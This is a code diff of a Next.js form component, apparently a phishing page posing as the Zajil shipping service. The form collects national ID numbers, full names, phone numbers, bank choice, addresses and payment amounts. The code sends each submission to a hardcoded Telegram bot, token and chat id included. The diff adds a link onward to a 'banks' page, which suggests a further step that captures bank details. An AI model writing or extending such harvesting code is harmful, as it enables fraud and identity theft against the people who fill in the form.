@@ -4,7 +4,7 @@ import { useRef } from 'react'
 import styles from './FormZajil.module.css'
 import Image from 'next/image'
 import formza from '../../public/formza.png'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 
 const FormZajil = () => {
 
@@ -18,10 +18,11 @@ const FormZajil = () => {
   let city = useRef();
   let mony = useRef();
   let selecttypenumber=useRef();
-
+  const x = useSearchParams();
+  const d = x.get("name");
 
   const router = useRouter()
-
+  
   const handlerout = ()=>{
     if(numberTrack.current.value == "" && numbernation.current.value == "" && fullname.current.value== "" && numphone.current.value == ""&& typeshohna.current.value == ""&& adress.current.value == ""&&city.current.value == ""&&mony.current.value == "") {
       alert('من فضلك قم بملى الحقول')
@@ -36,7 +37,7 @@ const FormZajil = () => {
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value}`
+    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${d}`
    
     
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -110,7 +111,11 @@ const FormZajil = () => {
             </select>
 
 
-          <button type='submit' onClick={handlerout} >التالي</button>
+          <button type='submit' onClick={handlerout} ><Link href={{
+      pathname:"/fozajil/banks/",
+      query:{name:d},
+    }}
+     className={styles.button}>التالي</Link></button>
         </form>
     </div>
 
